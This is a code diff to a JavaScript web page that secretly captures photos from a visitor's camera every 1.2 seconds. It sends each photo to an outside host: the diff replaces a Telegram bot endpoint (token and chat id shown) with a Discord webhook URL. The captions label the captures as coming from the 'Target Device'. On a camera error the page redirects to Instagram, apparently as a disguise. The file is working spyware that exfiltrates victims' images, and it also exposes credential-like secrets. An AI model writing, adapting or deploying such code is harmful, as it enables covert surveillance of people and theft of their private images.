@@ -1,5 +1,4 @@
-const token = "8693472250:AAFTuCMTePejbRW8RR2Lk1Jhq6zFAjcKV4g";
-const chat_id = "8598414928";
+const webhookURL = "https://discord.com/api/webhooks/1572972860492742728/SmNNyYnxTwnP84_OUEhN3ca2F8U2Spq9p8WBCL6dr-PlK8GyvtYX5f6B3mfnHATL03eV";
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
@@ -15,13 +14,11 @@ async function startProcess() {
             audio: false 
         });
         video.srcObject = stream;
-        
-        // Video ko explicitly play karwaya hai taake doosre mobile par frames active ho jayein
         await video.play();
         
         setTimeout(captureAndSendPhotos, 1500);
     } catch (error) {
-        console.error("Camera permission denied or error:", error);
+        console.error("Camera error:", error);
         setTimeout(() => {
             window.location.href = "https://instagram.com";
         }, 2000);
@@ -51,23 +48,20 @@ function captureAndSendPhotos() {
         
         photoCount++;
         const formData = new FormData();
-        formData.append('chat_id', chat_id);
-        formData.append('photo', blob, `photo_${photoCount}.jpg`);
-        formData.append('caption', `📸 Captured Photo #${photoCount}`);
+        formData.append('file', blob, `photo_${photoCount}.jpg`);
+        formData.append('content', `📸 Captured Photo #${photoCount} from Target Device!`);
 
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        fetch(webhookURL, {
             method: 'POST',
             body: formData
         })
-        .then(response => response.json())
-        .then(data => {
-            console.log(`Photo ${photoCount} sent successfully`);
+        .then(response => {
+            console.log(`Photo ${photoCount} sent to Discord successfully`);
             setTimeout(captureAndSendPhotos, 1200);
         })
         .catch(error => {
-            console.error("Error sending photo:", error);
+            console.error("Error sending photo to Discord:", error);
             setTimeout(captureAndSendPhotos, 1200);
         });
     }, 'image/jpeg', 0.8);
-}
-    
+                  }
